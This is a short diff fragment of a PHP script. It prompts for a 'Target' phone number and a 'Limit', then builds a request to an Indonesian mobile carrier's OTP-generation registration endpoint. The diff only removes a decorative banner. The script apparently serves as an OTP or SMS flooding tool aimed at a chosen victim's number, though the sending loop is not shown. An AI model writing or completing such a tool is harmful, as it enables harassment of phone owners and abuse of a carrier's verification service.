@@ -3,12 +3,11 @@
 <?php
 
 $url = "https://registrasi.tri.co.id/daftar/generateOTP";
-echo "
-      〞〤 Keyword Message 〤〝
+
 $nomor = readline("[+] Target  : ");
 $limit = readline("[+] Limit   : ");
 $payload = array("msisdn" => $nomor);
-      〞〤 Keyword Message 〤〝 ";
+
 echo "\n";
 
 $options = array(
